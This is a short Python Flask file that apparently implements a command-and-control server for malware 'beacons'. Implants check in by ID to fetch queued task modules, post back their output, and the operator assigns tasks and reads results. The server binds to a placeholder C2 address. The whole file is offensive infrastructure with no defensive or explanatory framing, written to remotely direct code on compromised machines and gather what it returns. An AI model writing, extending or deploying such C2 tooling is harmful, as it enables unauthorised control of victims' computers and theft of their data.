from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)

# Store live tasks in memory
tasks = {}
results = {}

@app.route('/checkin/<uid>', methods=['GET'])
def checkin(uid):
    print(f"[{datetime.datetime.now()}] Beacon checked in: {uid}")
    task = tasks.pop(uid, {"task": {"module": "none", "args": None}})
    return jsonify(task)

@app.route('/submit/<uid>', methods=['POST'])
def submit(uid):
    output = request.data.decode()
    results[uid] = output
    print(f"[+] Result from {uid}:\n{output}")
    return "OK"

@app.route('/task/<uid>', methods=['POST'])
def set_task(uid):
    data = request.json
    if not data or "module" not in data:
        return "Missing task", 400
    tasks[uid] = {"task": data}
    return f"Task set for {uid}: {data}", 200

@app.route('/results/<uid>', methods=['GET'])
def get_result(uid):
    return results.get(uid, "[No result yet]")

if __name__ == '__main__':
    #app.run(host="<c2_IP_here>", port=8443, ssl_context="adhoc")  # HTTPS test only, still a bit buggy with ssl certs
    app.run(host="<c2_IP_here>", port=8080)
